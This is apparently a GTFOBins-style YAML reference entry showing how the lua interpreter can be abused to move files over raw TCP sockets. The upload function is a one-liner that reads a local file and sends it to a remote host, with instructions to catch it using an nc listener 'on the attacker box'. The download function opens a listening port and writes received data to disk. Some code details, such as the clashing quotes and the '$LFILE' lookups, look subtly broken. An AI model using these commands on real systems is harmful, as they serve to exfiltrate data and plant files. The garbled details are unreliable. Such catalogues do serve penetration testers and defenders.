---
functions:
  file-upload:
    - description: Send a local file via TCP. Run `nc -l -p 4444 > "file_to_save"` on the attacker box to collect the file. This requires `lua-socket` installed.
      code: |
        lua -e '
          local f=io.open(os.getenv("$LFILE"), 'rb')
          local d=f:read("*a")
          io.close(f);
          local s=require("socket");
          local t=assert(s.tcp());
          t:connect(os.getenv("$RHOST"),os.getenv("$RPORT"));
          t:send(d);
          t:close();'
  file-download:
    - description: Fetch a remote file via TCP. Run `nc target.com 4444
        < "file_to_send"` on the attacker box to send the file. This requires `lua-socket` installed.
      code: |
        lua -e 'local k=require("socket");
          local s=assert(k.bind("*",os.getenv("$LPORT")));
          local c=s:accept();
          local d,x=c:receive("*a");
          c:close();
          local f=io.open(os.getenv("$LFILE"), "wb");
          f:write(d);
          io.close(f);'
---
